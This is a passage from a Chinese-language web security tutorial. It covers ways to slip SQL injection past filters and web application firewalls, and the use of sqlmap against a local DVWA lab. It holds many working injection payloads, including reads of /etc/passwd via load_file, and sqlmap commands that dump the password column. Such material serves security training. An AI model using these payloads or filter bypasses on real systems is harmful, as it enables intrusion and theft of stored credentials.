<td>#返回AB</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>SELECT pg_sleep(10)</td>
<td>#睡眠10秒</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT sleep(10)</td>
<td>#创建自定义睡眠</td>
<td></td>
</tr>
</tbody></table>
<h2 id="2-绕过网站防御机制思路"><a href="#2-绕过网站防御机制思路" class="headerlink" title="2.绕过网站防御机制思路"></a>2.绕过网站防御机制思路</h2><p>绝大部分的网站防御机制，无论是过滤、转义或是商业waf，都是基于某种正则表达式的规则匹配而运作的。也就是说，攻击者的行为一旦匹配了某种正则表达式所预料到的特征，就可能被拦截。而绕过防御机制则是，将简单的攻击语句复杂化，使其出乎编写防御程序者的意料，同时确保被复杂化的攻击语句保持原有的功效。下面将介绍几种常见的绕过思路：</p>
<h3 id="2-1-大小写绕过"><a href="#2-1-大小写绕过" class="headerlink" title="2.1 大小写绕过"></a>2.1 大小写绕过</h3><p>一般来说，只要网站考虑了防御机制，现在的设计者是不会忘记注意大小写的。但我们还是把绕过思路从简单到复杂的讲述出来，大小写绕过是最简单的一种绕过方法，它成功的前提是网站防御规则中只匹配了字母小写的攻击语句特征。如<code>select</code>可能会被规则发现，<code>SeLeCt</code>则不会。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fsec.com/index.php?page_id=1&#x27; and 1=2 uNIoN sELecT 1,2,3,4#</span><br></pre></td></tr></table></figure>

<h3 id="2-2-双写绕过"><a href="#2-2-双写绕过" class="headerlink" title="2.2 双写绕过"></a>2.2 双写绕过</h3><p>在某些网站，会对用户提交的一段字符进行匹配，对其认为危险的字符删除，同时放过余下其认为安全的字符。</p>
<p>例如，用户输入<code>1&#39; and 1=2 union select 1,2,3,4#</code>，经过网站的过滤机制，服务器实际接收到的则是<code>1&#39; and 1=2 1,2,3,4#</code></p>
<p>此时可以双写绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fsec.com/index.php?page_id=1&#x27; UNIunionON SELselectECT 1,2,3,4#</span><br></pre></td></tr></table></figure>

<p>经过网站过滤机制，<code>UNIunionON SELselectECT</code>实际变成了<code>UNION SELECT</code>。但要注意，这只适用于网站防御机制只匹配一次、过滤一次的情况。如果网站正则具有循环匹配，循环过滤直至匹配不到的机制，那么这种绕过方法就不再适用了。</p>
<h3 id="2-3-编码绕过"><a href="#2-3-编码绕过" class="headerlink" title="2.3 编码绕过"></a>2.3 编码绕过</h3><p>如果网站防御机制未考虑过各类编码情况，那么将攻击语句编码后再发送也是一种很好的方法。</p>
<h4 id="2-3-1-URL编码"><a href="#2-3-1-URL编码" class="headerlink" title="2.3.1 URL编码"></a>2.3.1 URL编码</h4><p>通常来说，在浏览器输入URL时，浏览器会对一些字符进行URL 编码如，空格变为%20、单引号%27、左括号%28、右括号%29。而服务器收到后会对其进行解码。如果网站具备防御机制，则会对解码后的内容进行规则匹配。然而一些程序在执行了过滤之后还会执行一次不必要的解码，</p>
<p>比如我们输入带有url编码的字符串：</p>
<p><code>1%2527%20and%201%253d1%23</code>,这条字符在会被解码为：<code>1%27 and 1%3d1#</code>，其中没有<code>&#39;</code>和<code>=</code>，假设这样就不会触发某些防御规则，然而当waf放过这串字符后，网站程序又会执行一次不必要的解码，再次解码后文本变成如此：<code>1&#39; and 1=1#</code>，这一条将被数据库执行。</p>
<h4 id="2-3-2-十六进制编码"><a href="#2-3-2-十六进制编码" class="headerlink" title="2.3.2 十六进制编码"></a>2.3.2 十六进制编码</h4><p><a target="_blank" rel="noopener" href="https://lzltool.com/hex">十六进制编码转换成文本字符串,base64,base64URL—LZL在线工具 (lzltool.com)</a></p>
<p>主要用于where语句后的<strong>引号</strong>问题，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=2 union select 1,table_name from information_schema.tables where table_schema= &#x27;dvwa&#x27;#</span><br><span class="line">1&#x27; and 1=2 union select 1,table_name from information_schema.tables where table_schema= 0x64767761#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618120621.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and 1=2 union select 1,load_file(&#x27;/etc/passwd&#x27;);#</span><br><span class="line">1 and 1=2 union select 1,load_file(0x2F6574632F706173737764);#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618120904.png"></p>
<h4 id="2-3-3-char-函数"><a href="#2-3-3-char-函数" class="headerlink" title="2.3.3 char()函数"></a>2.3.3 char()函数</h4><p>MySQL <code>CHAR()</code> 函数将每个参数对应的整数转为对应的字符，并将这些字符组成一个字符串返回。</p>
<p><code>CHAR()</code> 语法</p>
<p>这里是 MySQL <code>CHAR()</code> 函数的语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">CHAR</span>(num1, [num2, ...])</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li><p><em><code>num1, [num2, ...]</code></em></p>
<p>必需的。一些整数，或者能转为整数的值。</p>
</li>
</ul>
<p><strong>返回值</strong></p>
<p><code>CHAR()</code> 函数返回一个字符串，其中的字符由每个整数参数对应的字符组成。</p>
<p>参数 <code>num1, [num2, ...]</code> 包含的 <code>NULL</code> 值将被 <code>CHAR()</code> 函数忽略。</p>
<p><code>CHAR()</code> 示例</p>
<p>这里列出了几个常见的 <code>CHAR()</code> 示例。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>),</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>),</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65.4</span>, <span class="string">&#x27;66.5&#x27;</span>, <span class="string">&#x27;67.6&#x27;</span>),</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="keyword">NULL</span>, <span class="number">67</span>)\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">          <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>): ABC</span><br><span class="line">      <span class="type">CHAR</span>(<span class="number">65</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>): ABC</span><br><span class="line"><span class="type">CHAR</span>(<span class="number">65.4</span>, <span class="string">&#x27;66.5&#x27;</span>, <span class="string">&#x27;67.6&#x27;</span>): ABC</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="keyword">NULL</span>, <span class="number">67</span>): ABC</span><br></pre></td></tr></table></figure>

<h3 id="2-4-注释绕过"><a href="#2-4-注释绕过" class="headerlink" title="2.4 注释绕过"></a>2.4 注释绕过</h3><h4 id="2-4-1-注释绕过针对空格的过滤"><a href="#2-4-1-注释绕过针对空格的过滤" class="headerlink" title="2.4.1 注释绕过针对空格的过滤"></a>2.4.1 注释绕过针对空格的过滤</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union/**/select 1,2 #</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618170424.png"></p>
<p><img src="/img/20230618170507.png"></p>
<h4 id="2-4-2-内联注入"><a href="#2-4-2-内联注入" class="headerlink" title="2.4.2 内联注入"></a>2.4.2 内联注入</h4><p><code>/*![数据库版本][数据库函数]*/</code>，和注释<code>/**/</code>的区别是多了一个感叹号，可选的数据库版本号。</p>
<p>这种注释在mysql中叫做内联注释，当实际的版本等于或是高于写入的[数据库版本]，应用程序就会将注释内容解释为SQL命令，否则就会当做注释来处理。默认情况下，不添加数据库版本也会当做SQL命令来执行。</p>
<p>内联注释可以用来包裹数据库关键字和非关键字。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 /*!UNION*/ /*!SELECT*/ 1,2#</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/*asdw*/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">/**/</span><span class="comment">/*!50000UNION*/</span><span class="comment">/*abcd*/</span><span class="comment">/*!50000SELECT*/</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618170544.png"></p>
<h3 id="2-5-等价语句替换"><a href="#2-5-等价语句替换" class="headerlink" title="2.5 等价语句替换"></a>2.5 等价语句替换</h3><p>在有些函数或命令因其关键字被检测出来而无法使用的情况下，我们可以考虑使用与之等价或类似的代码替代其使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep() 与 benchmark()</span><br><span class="line">concat_ws() 与 group_concat()</span><br><span class="line">mid()=substr()=substring()</span><br></pre></td></tr></table></figure>

<p>sleep()与benchmark()</p>
<p>mysql中可用BENCHMARK(50000000,MD5(‘A’))产生延迟，执行MD5()50000000次，产生的延迟时间和服务器性能有关。</p>
<p><img src="/img/20230618170610.png"></p>
<p>concat_ws() 与 group_concat()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(str1,str2,…) //没有分隔符得连接字符串,</span><br><span class="line">concat_ws(separator,str1,str2,…) //含有分隔符得连接字符串</span><br><span class="line">group_concat(str1,str2,…) //连接一个组的所有字符串，并以逗号分割每条数据</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618170642.png"></p>
<p><img src="/img/20230618170701.png"></p>
<h3 id="2-6-常见过滤字符及绕过"><a href="#2-6-常见过滤字符及绕过" class="headerlink" title="2.6 常见过滤字符及绕过"></a>2.6 常见过滤字符及绕过</h3><p>当空格被过滤后，可通过以下方法绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释代替空格</span><br><span class="line">select * from tb1 where name=&#x27;asd&#x27;;</span><br><span class="line">等价：</span><br><span class="line">select/**/*/**/from/**/tb1/**/where/**/name=&#x27;asd&#x27;;</span><br><span class="line"></span><br><span class="line">括号代替空格</span><br><span class="line">mysql中可用()来代替空格。可以用括号包裹非数据库关键字</span><br><span class="line">select name from tb1 where name =&#x27;asd&#x27;;</span><br><span class="line">等价：</span><br><span class="line">select(name)from(tb1)where(name)=(&#x27;asd&#x27;);</span><br><span class="line"></span><br><span class="line">引号代替空格</span><br><span class="line">mysql中可用单引号或双引号来代替空格。</span><br><span class="line">select name from tb1 where name =&#x27;asd&#x27; and 1=1;</span><br><span class="line">等价：</span><br><span class="line">select name from tb1 where name =&#x27;asd&#x27;and&#x27;1&#x27;=&#x27;1&#x27;;</span><br><span class="line"></span><br><span class="line">特殊字符代替空格</span><br><span class="line">如下特殊字符可代替空格：</span><br><span class="line">%09    水平定位符号%0a    换行符%0c    换页符%0d    回车%0b    垂直定位符号</span><br><span class="line"></span><br><span class="line">用Tab代替空格</span><br></pre></td></tr></table></figure>

<p>过滤union\select</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绕过示例：过滤代码 union select user,password from users</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users where userid=1)=&#x27;admin&#x27;</span><br><span class="line">十六进制字符绕过select ——&gt; selec\x74union——&gt;unio\x6e</span><br><span class="line">大小写绕过SelEct</span><br><span class="line">双写绕过selselectectuniunionon</span><br><span class="line">urlencode，ascii(char)，hex，unicode编码绕过关键字</span><br><span class="line">内联绕所有/*!union*//*!select*/</span><br></pre></td></tr></table></figure>

<p>过滤引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可通过注释、括号、内联注释代替引号。</span><br><span class="line">字符串可写作0x十六进制。</span><br><span class="line">select * from tb1 where name=&#x27;asd&#x27;;</span><br><span class="line">等价</span><br><span class="line">select * from tb1 where name=0x617364;</span><br></pre></td></tr></table></figure>

<p>过滤&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; or 1 like 1#可以绕过对 = &gt; 等过滤</span><br><span class="line">or &#x27;1&#x27; IN (&#x27;1234&#x27;)#可以替代=</span><br></pre></td></tr></table></figure>

<p>过滤逗号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用mid，substr，substring函数的时候，如果逗号被过滤，可以通过from x for y代替。</span><br><span class="line">select mid(user(),1,2);                #从第一个字符开始截取2个</span><br><span class="line">等价</span><br><span class="line">select mid(user() from 1 for 2);    #从第一个字符开始截取2个</span><br></pre></td></tr></table></figure>

<p>过滤注释符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试中通常需要通过注释符屏蔽后面的语句，否则容易报错，但注释符被过滤了。</span><br><span class="line">例如：select * from tb1 where id=$_GET[‘id’] limit 1; //limit1是我们想要屏蔽的语句。</span><br><span class="line">1.通过;结束语句，如果系统不支持堆查询注入，那么后面语句不会执行，或者执行了也能屏蔽错误。</span><br><span class="line">select * from tb1 where id=1; limit 1;</span><br><span class="line">2.整数型注入不受影响</span><br><span class="line">select * from tb1 where id=1 or 1=1 limit 1;</span><br><span class="line">3.字符型注入,传入的参数前后被加上了引号，select * from tb1 where id=&#x27;$_GET[&#x27;id&#x27;]&#x27; limit 1; </span><br><span class="line">这时候可以传入1&#x27; or &#x27;1&#x27;=&#x27;1  ，再拼接上引号后就能完整。</span><br><span class="line">select * from tb1 where id=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; limit 1;</span><br></pre></td></tr></table></figure>

<p>过滤where</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>过滤limit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;#user_id聚合中user_id为1的user为admin</span><br></pre></td></tr></table></figure>

<p>过滤group by</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br></pre></td></tr></table></figure>

<p>过滤select</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) = &#x27;a&#x27;</span><br></pre></td></tr></table></figure>

<p>过滤hex</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>

<p>过滤substr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="line">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;r&#x27;</span><br></pre></td></tr></table></figure>

<p>过滤and，or</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#等价关键字，在很多时候，当关键字被过滤后，可通过与其等价的其他关键字来绕过。</span><br><span class="line">等价and</span><br><span class="line">假如：select * from tb1 where id=1 and 1=1</span><br><span class="line">此时和and等价关键字有：like（1 like 1。like可跟通配符。），rlike（1 rlike 1 rlike可跟正则表达式。），regexp（1 regexp 1 regexp可跟正则表达式。），&amp;（1 &amp;&amp; 1 ，逻辑与），&amp;&amp;（1 &amp; 1，按位与，任意数&amp;0的值为0），与and的结果都是1.</span><br><span class="line"></span><br><span class="line">等价or</span><br><span class="line">假如：select * from tb1 where id=1 or 1=1;</span><br><span class="line">此时等价or的关键字有：||    （逻辑或），|    （按位或），任意数|0的值为任意数</span><br></pre></td></tr></table></figure>

<h1 id="14-sqlmap"><a href="#14-sqlmap" class="headerlink" title="14 sqlmap"></a>14 sqlmap</h1><h2 id="1-基本语句"><a href="#1-基本语句" class="headerlink" title="1 基本语句"></a>1 基本语句</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：</span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$url</span>&quot;</span> --dbs  <span class="comment">#注入这个URL，注入出库名。</span></span><br><span class="line">windows：</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;<span class="variable">$url</span>&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>以DVWA为例，由于DVWA需要登录，没有cookie是无法访问这个网站的。所以还需要指定cookie参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$url</span>&quot;</span> --cookie=<span class="string">&quot;<span class="variable">$cookie</span>&quot;</span>  --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.43.252/vulnerabilities/sqli/?id=12&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=iuefue0ve30qnodkna7j236e82; security=low; security_level=0&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>如果注入点所在是一个POST请求的网页，或者你不想指定cookie这样麻烦。也可以在burp中保存请求包为一个文件，再用sqlmap中的<code>-r</code></p>
<p>参数指定这个文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220924090317.png"></p>
<h2 id="2-命令"><a href="#2-命令" class="headerlink" title="2 命令"></a>2 命令</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-u             <span class="comment">#指定url</span></span><br><span class="line">-r             <span class="comment">#指定文件</span></span><br><span class="line">-p             <span class="comment">#指定注入点</span></span><br><span class="line">--cookie       <span class="comment">#指定cookie</span></span><br><span class="line">--dbs          <span class="comment">#注入库名</span></span><br><span class="line">--D            <span class="comment">#指定库名</span></span><br><span class="line">--tables       <span class="comment">#注入表名</span></span><br><span class="line">-T             <span class="comment">#指定表名</span></span><br><span class="line">--columns      <span class="comment">#注入列名</span></span><br><span class="line">-C             <span class="comment">#指定列名</span></span><br><span class="line">--dump         <span class="comment">#注入数据</span></span><br><span class="line">--dbms         <span class="comment">#指定数据库类型</span></span><br></pre></td></tr></table></figure>

<p>继续以DVWA为例子，注入dvwa库下的表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D dvwa --tables</span><br></pre></td></tr></table></figure>

<p>注入dvwa库下，users表下的列名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<p>以url中的id为注入点，注入dvwa库下，users表下的password列的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -p id -D dvwa -T users -C password --dump</span><br></pre></td></tr></table></figure>

<h2 id="全部命令"><a href="#全部命令" class="headerlink" title="全部命令"></a>全部命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            <span class="comment">#显示常用命令</span></span><br><span class="line">  -hh                   <span class="comment">#全部命令</span></span><br><span class="line">  --version             <span class="comment">#Show program&#x27;s version number and exit</span></span><br><span class="line">  -v VERBOSE            <span class="comment">#Verbosity level: 0-6 (default 1)</span></span><br><span class="line"></span><br><span class="line">  Target:</span><br><span class="line">    At least one of these options has to be provided to define the</span><br><span class="line">    target(s)</span><br><span class="line"></span><br><span class="line">    -u URL, --url=URL   Target URL (e.g. <span class="string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)</span><br><span class="line">    -d DIRECT           Connection string <span class="keyword">for</span> direct database connection</span><br><span class="line">    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy <span class="built_in">log</span> file</span><br><span class="line">    -m BULKFILE         Scan multiple targets given <span class="keyword">in</span> a textual file</span><br><span class="line">    -r REQUESTFILE      Load HTTP request from a file</span><br><span class="line">    -g GOOGLEDORK       Process Google dork results as target URLs</span><br><span class="line">    -c CONFIGFILE       Load options from a configuration INI file</span><br><span class="line"></span><br><span class="line">  Request:</span><br><span class="line">    These options can be used to specify how to connect to the target URL</span><br><span class="line"></span><br><span class="line">    -A AGENT, --user..  HTTP User-Agent header value</span><br><span class="line">    -H HEADER, --hea..  Extra header (e.g. <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)</span><br><span class="line">    --method=METHOD     Force usage of given HTTP method (e.g. PUT)</span><br><span class="line">    --data=DATA         Data string to be sent through POST (e.g. <span class="string">&quot;id=1&quot;</span>)</span><br><span class="line">    --param-del=PARA..  Character used <span class="keyword">for</span> splitting parameter values (e.g. &amp;)</span><br><span class="line">    --cookie=COOKIE     HTTP Cookie header value (e.g. <span class="string">&quot;PHPSESSID=a8d127e..&quot;</span>)</span><br><span class="line">    --cookie-del=COO..  Character used <span class="keyword">for</span> splitting cookie values (e.g. ;)</span><br><span class="line">    --live-cookies=L..  Live cookies file used <span class="keyword">for</span> loading up-to-date values</span><br><span class="line">    --load-cookies=L..  File containing cookies <span class="keyword">in</span> Netscape/wget format</span><br><span class="line">    --drop-set-cookie   Ignore Set-Cookie header from response</span><br><span class="line">    --mobile            Imitate smartphone through HTTP User-Agent header</span><br><span class="line">    --random-agent      Use randomly selected HTTP User-Agent header value</span><br><span class="line">    --host=HOST         HTTP Host header value</span><br><span class="line">    --referer=REFERER   HTTP Referer header value</span><br><span class="line">    --headers=HEADERS   Extra headers (e.g. <span class="string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)</span><br><span class="line">    --auth-type=AUTH..  HTTP authentication <span class="built_in">type</span> (Basic, Digest, Bearer, ...)</span><br><span class="line">    --auth-cred=AUTH..  HTTP authentication credentials (name:password)</span><br><span class="line">    --auth-file=AUTH..  HTTP authentication PEM cert/private key file</span><br><span class="line">    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)</span><br><span class="line">    --ignore-proxy      Ignore system default proxy settings</span><br><span class="line">    --ignore-redirects  Ignore redirection attempts</span><br><span class="line">    --ignore-timeouts   Ignore connection timeouts</span><br><span class="line">    --proxy=PROXY       Use a proxy to connect to the target URL</span><br><span class="line">    --proxy-cred=PRO..  Proxy authentication credentials (name:password)</span><br><span class="line">    --proxy-file=PRO..  Load proxy list from a file</span><br><span class="line">    --proxy-freq=PRO..  Requests between change of proxy from a given list</span><br><span class="line">    --tor               Use Tor anonymity network</span><br><span class="line">    --tor-port=TORPORT  Set Tor proxy port other than default</span><br><span class="line">    --tor-type=TORTYPE  Set Tor proxy <span class="built_in">type</span> (HTTP, SOCKS4 or SOCKS5 (default))</span><br><span class="line">    --check-tor         Check to see <span class="keyword">if</span> Tor is used properly</span><br><span class="line">    --delay=DELAY       Delay <span class="keyword">in</span> seconds between each HTTP request</span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   Seconds to <span class="built_in">wait</span> before <span class="built_in">timeout</span> connection (default 30)</span><br><span class="line">    --retries=RETRIES   Retries when the connection timeouts (default 3)</span><br><span class="line">    --retry-on=RETRYON  Retry request on regexp matching content (e.g. <span class="string">&quot;drop&quot;</span>)</span><br><span class="line">    --randomize=RPARAM  Randomly change value <span class="keyword">for</span> given parameter(s)</span><br><span class="line">    --safe-url=SAFEURL  URL address to visit frequently during testing</span><br><span class="line">    --safe-post=SAFE..  POST data to send to a safe URL</span><br><span class="line">    --safe-req=SAFER..  Load safe HTTP request from a file</span><br><span class="line">    --safe-freq=SAFE..  Regular requests between visits to a safe URL</span><br><span class="line">    --skip-urlencode    Skip URL encoding of payload data</span><br><span class="line">    --csrf-token=CSR..  Parameter used to hold anti-CSRF token</span><br><span class="line">    --csrf-url=CSRFURL  URL address to visit <span class="keyword">for</span> extraction of anti-CSRF token</span><br><span class="line">    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit</span><br><span class="line">    --csrf-retries=C..  Retries <span class="keyword">for</span> anti-CSRF token retrieval (default 0)</span><br><span class="line">    --force-ssl         Force usage of SSL/HTTPS</span><br><span class="line">    --chunked           Use HTTP chunked transfer encoded (POST) requests</span><br><span class="line">    --hpp               Use HTTP parameter pollution method</span><br><span class="line">    --<span class="built_in">eval</span>=EVALCODE     Evaluate provided Python code before the request (e.g.</span><br><span class="line">                        <span class="string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)</span><br><span class="line"></span><br><span class="line">  Optimization:</span><br><span class="line">    These options can be used to optimize the performance of sqlmap</span><br><span class="line"></span><br><span class="line">    -o                  Turn on all optimization switches</span><br><span class="line">    --predict-output    Predict common queries output</span><br><span class="line">    --keep-alive        Use persistent HTTP(s) connections</span><br><span class="line">    --null-connection   Retrieve page length without actual HTTP response body</span><br><span class="line">    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)</span><br><span class="line"></span><br><span class="line">  Injection:</span><br><span class="line">    These options can be used to specify <span class="built_in">which</span> parameters to <span class="built_in">test</span> <span class="keyword">for</span>,</span><br><span class="line">    provide custom injection payloads and optional tampering scripts</span><br><span class="line"></span><br><span class="line">    -p TESTPARAMETER    Testable parameter(s)</span><br><span class="line">    --skip=SKIP         Skip testing <span class="keyword">for</span> given parameter(s)</span><br><span class="line">    --skip-static       Skip testing parameters that not appear to be dynamic</span><br><span class="line">    --param-exclude=..  Regexp to exclude parameters from testing (e.g. <span class="string">&quot;ses&quot;</span>)</span><br><span class="line">    --param-filter=P..  Select testable parameter(s) by place (e.g. <span class="string">&quot;POST&quot;</span>)</span><br><span class="line">    --dbms=DBMS         Force back-end DBMS to provided value</span><br><span class="line">    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)</span><br><span class="line">    --os=OS             Force back-end DBMS operating system to provided value</span><br><span class="line">    --invalid-bignum    Use big numbers <span class="keyword">for</span> invalidating values</span><br><span class="line">    --invalid-logical   Use logical operations <span class="keyword">for</span> invalidating values</span><br><span class="line">    --invalid-string    Use random strings <span class="keyword">for</span> invalidating values</span><br><span class="line">    --no-cast           Turn off payload casting mechanism</span><br><span class="line">    --no-escape         Turn off string escaping mechanism</span><br><span class="line">    --prefix=PREFIX     Injection payload prefix string</span><br><span class="line">    --suffix=SUFFIX     Injection payload suffix string</span><br><span class="line">    --tamper=TAMPER     Use given script(s) <span class="keyword">for</span> tampering injection data</span><br><span class="line"></span><br><span class="line">  Detection:</span><br><span class="line">    These options can be used to customize the detection phase</span><br><span class="line"></span><br><span class="line">    --level=LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class="line">    --risk=RISK         Risk of tests to perform (1-3, default 1)</span><br><span class="line">    --string=STRING     String to match when query is evaluated to True</span><br><span class="line">    --not-string=NOT..  String to match when query is evaluated to False</span><br><span class="line">    --regexp=REGEXP     Regexp to match when query is evaluated to True</span><br><span class="line">    --code=CODE         HTTP code to match when query is evaluated to True</span><br><span class="line">    --smart             Perform thorough tests only <span class="keyword">if</span> positive heuristic(s)</span><br><span class="line">    --text-only         Compare pages based only on the textual content</span><br><span class="line">    --titles            Compare pages based only on their titles</span><br><span class="line"></span><br><span class="line">  Techniques:</span><br><span class="line">    These options can be used to tweak testing of specific SQL injection</span><br><span class="line">    techniques</span><br><span class="line"></span><br><span class="line">    --technique=TECH..  SQL injection techniques to use (default <span class="string">&quot;BEUSTQ&quot;</span>)</span><br><span class="line">    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)</span><br><span class="line">    --union-cols=UCOLS  Range of columns to <span class="built_in">test</span> <span class="keyword">for</span> UNION query SQL injection</span><br><span class="line">    --union-char=UCHAR  Character to use <span class="keyword">for</span> bruteforcing number of columns</span><br><span class="line">    --union-from=UFROM  Table to use <span class="keyword">in</span> FROM part of UNION query SQL injection</span><br><span class="line">    --dns-domain=DNS..  Domain name used <span class="keyword">for</span> DNS exfiltration attack</span><br><span class="line">    --second-url=SEC..  Resulting page URL searched <span class="keyword">for</span> second-order response</span><br><span class="line">    --second-req=SEC..  Load second-order HTTP request 